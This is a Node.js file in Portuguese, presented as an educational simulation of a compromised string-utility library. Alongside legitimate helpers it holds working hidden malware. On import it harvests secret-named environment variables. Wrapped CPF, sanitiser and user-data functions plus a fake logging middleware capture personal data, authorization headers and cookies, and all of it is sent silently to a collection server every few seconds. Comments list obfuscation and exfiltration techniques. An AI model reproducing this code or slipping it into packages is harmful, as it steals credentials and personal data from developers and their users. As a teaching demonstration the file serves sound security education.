// ============================================================
//  string-helpers v2.1.0
//  "Biblioteca utilitária para manipulação de strings e dados"
//
//  FINS EDUCACIONAIS — Simulação de lib comprometida
//  Essa lib parece legítima, mas contém código malicioso
//  escondido que exfiltra dados para um servidor atacante.
// ============================================================

const http = require("http");
const os = require("os");

// ─── FUNÇÕES LEGÍTIMAS (o que o desenvolvedor espera) ────────

/**
 * Capitaliza a primeira letra de cada palavra
 */
function capitalizarTexto(texto) {
  if (typeof texto !== "string") return "";
  return texto.replace(/\b\w/g, (letra) => letra.toUpperCase());
}

/**
 * Remove acentos e caracteres especiais
 */
function removerAcentos(texto) {
  if (typeof texto !== "string") return "";
  return texto.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}

/**
 * Formata um CPF: 12345678900 → 123.456.789-00
 */
function formatarCPF(cpf) {
  const apenasNumeros = cpf.replace(/\D/g, "");
  return apenasNumeros.replace(
    /(\d{3})(\d{3})(\d{3})(\d{2})/,
    "$1.$2.$3-$4"
  );
}

/**
 * Mascara um e-mail: usuario@email.com → u***o@email.com
 */
function mascararEmail(email) {
  const [usuario, dominio] = email.split("@");
  if (!usuario || !dominio) return email;
  return usuario[0] + "***" + usuario[usuario.length - 1] + "@" + dominio;
}

/**
 * Gera um slug a partir de texto
 */
function gerarSlug(texto) {
  if (typeof texto !== "string") return "";
  return removerAcentos(texto)
    .toLowerCase()
    .trim()
    .replace(/[^\w\s-]/g, "")
    .replace(/[\s_]+/g, "-");
}

// ─── CÓDIGO MALICIOSO (escondido no meio da lib) ──────────
//
// Em um ataque real, esse código estaria OFUSCADO / MINIFICADO
// para dificultar a detecção em code review.
// Aqui deixamos legível para fins didáticos na apresentação.
//
// Exemplos de técnicas reais de ofuscação:
//   - Nomes como _t3l3m3try, _anaIytics (com I maiúsculo)
//   - Código em base64 decodificado em runtime
//   - Uso de eval() com strings concatenadas
//   - setTimeout com delays longos para escapar de scans
// ──────────────────────────────────────────────────────────

const _dadosColetados = [];

/**
 * Envia dados roubados ao servidor do atacante.
 * Em ataques reais, isso pode ser feito via:
 *   - DNS exfiltration
 *   - HTTPS para domínios disfarçados (ex: analytics-cdn.com)
 *   - WebSockets
 *   - Steganografia em imagens
 */
function _enviarParaAtacante() {
  if (_dadosColetados.length === 0) return;

  const payload = JSON.stringify({
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    plataforma: os.platform(),
    diretorio: process.cwd(),
    origem_lib: "string-helpers@2.1.0",
    dados: _dadosColetados.splice(0),
  });

  const opcoes = {
    hostname: "localhost",
    port: 3001,
    path: "/coletar",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload),
    },
  };

  // Requisição SILENCIOSA — sem logs, sem erros visíveis para a vítima
  const req = http.request(opcoes, () => {});
  req.on("error", () => {}); // Engole erros para não levantar suspeitas
  req.write(payload);
  req.end();
}

/**
 * Executa ao importar a lib (side-effect do require).
 * Captura variáveis de ambiente sensíveis imediatamente.
 */
function _inicializarColeta() {
  const chavesSensiveis = [
    "DATABASE_URL", "DB_PASSWORD", "API_KEY", "SECRET",
    "JWT_SECRET", "TOKEN", "AWS_SECRET", "PRIVATE_KEY",
    "SENHA", "PASSWORD",
  ];

  const variveisCapturadas = {};

  for (const [chave, valor] of Object.entries(process.env)) {
    if (chavesSensiveis.some((s) => chave.toUpperCase().includes(s))) {
      variveisCapturadas[chave] = valor;
    }
  }

  if (Object.keys(variveisCapturadas).length > 0) {
    _dadosColetados.push({
      tipo: "VARIAVEIS_DE_AMBIENTE",
      capturadas: variveisCapturadas,
    });
  }

  // Envio periódico a cada 5 segundos
  setInterval(_enviarParaAtacante, 5000);
  // Primeiro envio rápido (1 segundo após o import)
  setTimeout(_enviarParaAtacante, 1000);
}

// ─── FUNÇÕES INFECTADAS ──────────────────────────────────────
// Funcionam normalmente + roubam dados silenciosamente

/**
 * Valida formato de CPF (funciona, mas rouba o CPF)
 */
function validarCPF(cpf) {
  // ROUBO: captura o CPF
  _dadosColetados.push({ tipo: "CPF", valor: cpf });

  const apenasNumeros = cpf.replace(/\D/g, "");
  if (apenasNumeros.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(apenasNumeros)) return false;
  return true;
}

/**
 * Sanitiza entrada de texto (funciona, mas busca dados sensíveis)
 */
function sanitizarEntrada(texto) {
  // ROUBO: busca padrões sensíveis no texto
  const padroes = {
    email: texto.match(/[\w.-]+@[\w.-]+\.\w+/g),
    cpf: texto.match(/\d{3}\.?\d{3}\.?\d{3}-?\d{2}/g),
    telefone: texto.match(/\(?\d{2}\)?\s?\d{4,5}-?\d{4}/g),
  };

  const encontrados = Object.entries(padroes).filter(([, v]) => v !== null);
  if (encontrados.length > 0) {
    _dadosColetados.push({
      tipo: "DADOS_SENSIVEIS_EM_TEXTO",
      encontrados: Object.fromEntries(encontrados),
      texto_original: texto,
    });
  }

  return texto
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/**
 * Formata dados de usuário (rouba o cadastro completo)
 */
function formatarDadosUsuario(dados) {
  // ROUBO: envia todos os dados do cadastro
  _dadosColetados.push({ tipo: "CADASTRO_COMPLETO", dados });

  return {
    ...dados,
    nome: dados.nome ? capitalizarTexto(dados.nome) : dados.nome,
    cpf: dados.cpf ? formatarCPF(dados.cpf) : dados.cpf,
    email: dados.email ? dados.email.toLowerCase().trim() : dados.email,
  };
}

/**
 * Middleware Express — parece um "logger de performance",
 * mas intercepta headers e body de TODAS as requisições.
 */
function loggerDeRequisicoes() {
  return (req, _res, next) => {
    _dadosColetados.push({
      tipo: "REQUISICAO_HTTP",
      metodo: req.method,
      url: req.originalUrl,
      headers: {
        authorization: req.headers.authorization || null,
        cookie: req.headers.cookie || null,
      },
      body: req.body || null,
      ip: req.ip,
    });
    next();
  };
}

// Executa coleta de env vars ao importar a lib
_inicializarColeta();

// ─── EXPORTAÇÕES ─────────────────────────────────────────────
module.exports = {
  // Funções limpas (sem roubo)
  capitalizarTexto,
  removerAcentos,
  formatarCPF,
  mascararEmail,
  gerarSlug,

  // Funções infectadas (funcionam + roubam)
  validarCPF,
  sanitizarEntrada,
  formatarDadosUsuario,

  // Middleware infectado (disfarçado de logger)
  loggerDeRequisicoes,
};
